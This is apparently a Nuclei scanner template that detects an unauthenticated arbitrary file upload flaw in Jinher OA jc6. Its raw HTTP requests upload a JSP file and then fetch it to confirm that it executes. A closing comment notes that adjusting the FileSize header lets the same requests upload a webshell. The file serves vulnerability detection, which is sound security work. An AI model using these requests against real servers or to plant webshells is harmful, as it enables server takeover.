id: jinher-uploadFileForJinht-upload
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: 金和OA jc6系统uploadFileForJinht接口处存在任意文件上传漏洞，未经身份认证的攻击者可利用此漏洞上传恶意后门文件，最终可导致服务器失陷。
  reference:
    - http://kpanda.wiki/#/Vulnhub/J1-15%E9%87%91%E5%92%8C-OA-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0?id=j1-15%e9%87%91%e5%92%8c-oa-%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0
  tags: tags
variables:
  filename: "{{rand_base(6)}}"  
http:
  - raw:
      - |-
        POST /jc6/JHSoft.WCF/Attachment/uploadFileForJinht HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
        Connection: close
        UploadFileName: {{filename}}.jsp
        FileSize: 40
        StartPosition: 0
        isFromMobilePhone: 1
        Content-Length: 35

        <% out.println("Hello, World!"); %>
      - |
        POST /jc6/JHSoft.WCF/Attachment/UploadFile HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
        Connection: close
        UploadFileName: {{filename}}.jsp
        FileSize: 40
        StartPosition: 0
        Content-Length: 37

        <% out.println("Hello, World!"); %>
      - |+
        GET /jc6/upload/{{filename}}.jsp HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - 'Hello, World!'
#PS：上传webshell需要修改请求头 FileSize长度